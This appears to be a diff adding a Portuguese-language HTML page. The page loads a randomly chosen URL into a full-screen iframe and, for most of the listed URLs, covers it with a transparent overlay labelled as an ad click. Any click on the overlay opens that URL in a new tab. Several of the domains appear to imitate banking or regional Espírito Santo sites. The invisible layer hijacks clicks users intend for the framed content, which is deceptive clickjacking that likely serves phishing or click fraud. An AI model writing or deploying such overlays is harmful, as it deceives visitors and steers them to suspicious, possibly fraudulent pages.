@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Iframe com clique só para link específico</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+    }
+    #container {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    #click-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      cursor: pointer;
+      background: rgba(0, 0, 0, 0); /* invisível */
+      z-index: 10;
+      display: none; /* começa escondido */
+    }
+  </style>
+</head>
+<body>
+
+  <div id="container">
+    <iframe id="iframe-fixo" title="Iframe Randomizado" loading="lazy"></iframe>
+    <div id="click-overlay" aria-label="Clique no anúncio"></div>
+  </div>
+
+  <script>
+    const links = [
+      "https://uteis01.pages.dev/servicobancario",
+      "https://modeloanuncio01.pages.dev/",
+      "https://geocredibnkvitoria.com/",
+      "https://www.larissasaib.com.br/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/12",
+      "https://espiritosantoes-com-brprincipal.pages.dev/33"
+    ];
+
+    const linkSorteado = links[Math.floor(Math.random() * links.length)];
+    const iframe = document.getElementById('iframe-fixo');
+    const overlay = document.getElementById('click-overlay');
+
+    iframe.src = linkSorteado;
+
+    // Só ativa a camada se for o link específico
+    if (linkSorteado === "https://uteis01.pages.dev/servicobancario" || linkSorteado==="https://geocredibnkvitoria.com/"|| linkSorteado==="https://www.larissasaib.com.br/" ||linkSorteado==="https://espiritosantoes-com-brprincipal.pages.dev/12"|| linkSorteado==="https://espiritosantoes-com-brprincipal.pages.dev/33") {
+      overlay.style.display = "block"; // mostra a camada
+      overlay.addEventListener('click', () => {
+        window.open(linkSorteado, "_blank"); // ou faça qualquer outra ação
+      });
+    }
+  </script>
+
+</body>
+</html>
